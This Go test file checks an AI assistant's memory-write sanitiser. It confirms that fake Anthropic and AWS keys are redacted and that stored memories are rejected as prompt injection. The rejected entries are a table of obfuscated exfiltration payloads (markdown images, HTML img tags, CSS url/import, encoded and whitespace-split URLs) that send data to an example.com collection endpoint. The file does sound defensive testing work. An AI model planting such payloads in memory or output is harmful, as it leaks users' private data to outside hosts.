package workspace

import (
	"errors"
	"strings"
	"testing"

	"synon-go/internal/memorypolicy"
)

func TestPrepareUserMemoryBodyRedactsCredentialsAndRejectsExfilPayloads(t *testing.T) {
	body, err := PrepareUserMemoryBody("Use sk-ant-abcdefghijklmnopqrstuvwxyz123456 and AKIA1234567890ABCDEF for testing")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(body, "sk-ant-") || strings.Contains(body, "AKIA1234567890ABCDEF") ||
		!strings.Contains(body, "[REDACTED:ANTHROPIC_API_KEY]") || !strings.Contains(body, "[REDACTED:AWS_ACCESS_KEY_ID]") {
		t.Fatalf("credential redaction = %q", body)
	}

	unsafe := map[string]struct {
		body    string
		pattern string
	}{
		"markdown_image":         {body: `![private](https://example.com/collect?q=secret)`, pattern: "markdown_image"},
		"html_fetch":             {body: `<img src="//example.com/collect">`, pattern: "html_fetch"},
		"html_entity_fetch":      {body: `&lt;img src=&quot;//example.com/collect&quot;&gt;`, pattern: "html_fetch"},
		"css_url":                {body: `background: url(https://example.com/collect)`, pattern: "css_url"},
		"css_import":             {body: `@import "//example.com/collect"`, pattern: "css_import"},
		"css_image_set":          {body: `background: image-set("//example.com/a" 1x)`, pattern: "css_image_set"},
		"css_escape_url":         {body: `background: u\72l(//example.com/collect)`, pattern: "css_url"},
		"spaced_protocol":        {body: "<img src= h\tt\nt\rp\t://example.com/collect>", pattern: "html_fetch"},
		"wrapped_markdown_image": {body: `<memory>&#33;&#91;private&#93;(https://example.com/collect)</memory>`, pattern: "markdown_image"},
		"long_url":               {body: `https://example.com/` + strings.Repeat("x", 160), pattern: "url_base64_payload"},
		"base64_query_url":       {body: `https://example.com/?payload=` + strings.Repeat("A", 90), pattern: "url_base64_payload"},
	}
	for name, value := range unsafe {
		t.Run(name, func(t *testing.T) {
			_, err := PrepareUserMemoryBody(value.body)
			if !errors.Is(err, ErrMemoryPromptInjection) {
				t.Fatalf("unsafe body error = %v", err)
			}
			if err.Error() != "Memory write rejected: content flagged as potential prompt injection (exfil: "+value.pattern+")" {
				t.Fatalf("unsafe body detail = %q", err)
			}
		})
	}
}

func TestPrepareUserMemoryBodyKeepsBenignTextAndAppliesWorkspacePersistCap(t *testing.T) {
	value := "[System] This is a quoted user preference with https://example.com/reference."
	prepared, err := PrepareUserMemoryBody(value)
	if err != nil || prepared != value {
		t.Fatalf("benign memory = %q, %v", prepared, err)
	}
	if prepared, err := PrepareUserMemoryBody(strings.Repeat("x", memorypolicy.TextMaxUTF16Units+1)); err != nil || memorypolicy.UTF16Length(prepared) != memorypolicy.TextMaxUTF16Units || !strings.HasSuffix(prepared, "…") {
		t.Fatalf("oversized persisted memory = %q, %v", prepared, err)
	}
	if prepared, err := PrepareUserMemoryBody(strings.Repeat("a", memorypolicy.TextMaxUTF16Units-1) + "🧪"); err != nil || memorypolicy.UTF16Length(prepared) != memorypolicy.TextMaxUTF16Units || !strings.HasSuffix(prepared, "…") {
		t.Fatalf("UTF-16 persisted cap = %q, %v", prepared, err)
	}
	if prepared, err := PrepareUserMemoryBody("   "); err != nil || prepared != "   " {
		t.Fatalf("whitespace user memory = %q, %v", prepared, err)
	}
	expanding := strings.Repeat("x", 980) + "AKIA1234567890ABCDEF"
	if prepared, err := PrepareUserMemoryBody(expanding); err != nil || memorypolicy.UTF16Length(prepared) != memorypolicy.TextMaxUTF16Units || !strings.HasSuffix(prepared, "…") {
		t.Fatalf("redaction-expanded persisted cap length=%d value=%q err=%v", memorypolicy.UTF16Length(prepared), prepared, err)
	}
}
